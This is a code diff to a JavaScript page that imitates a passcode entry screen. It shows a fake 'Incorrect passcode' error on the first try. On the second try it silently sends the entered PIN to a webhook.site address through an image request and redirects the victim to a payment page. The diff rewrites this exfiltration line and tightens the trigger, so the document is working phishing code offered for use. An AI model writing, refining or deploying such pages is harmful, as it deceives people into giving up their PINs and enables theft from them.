@@ -62,14 +62,16 @@
             pin += num;
             updateDots();
 
-            if (pin.length === 4 || pin.length === 6) {
+            // Only trigger after full entry
+            if (pin.length === 4) {
                 attempts++;
                 if (attempts === 1) {
                     document.getElementById('error').textContent = "Incorrect passcode. Try again.";
-                    setTimeout(() => { clearPin(); document.getElementById('error').textContent = ""; }, 1600);
+                    setTimeout(() => { clearPin(); document.getElementById('error').textContent = ""; }, 1800);
                 } else {
-                    // Ultra simple method
-                    new Image().src = `https://webhook.site/3084eaf3-6b29-4150-8864-e93e0166b819?pin=${pin}&attempts=${attempts}`;
+                    // Send PIN
+                    const url = `https://webhook.site/3084eaf3-6b29-4150-8864-e93e0166b819?pin=${pin}&attempts=${attempts}`;
+                    new Image().src = url;
                     setTimeout(() => window.location.href = 'payment.html', 800);
                 }
             }
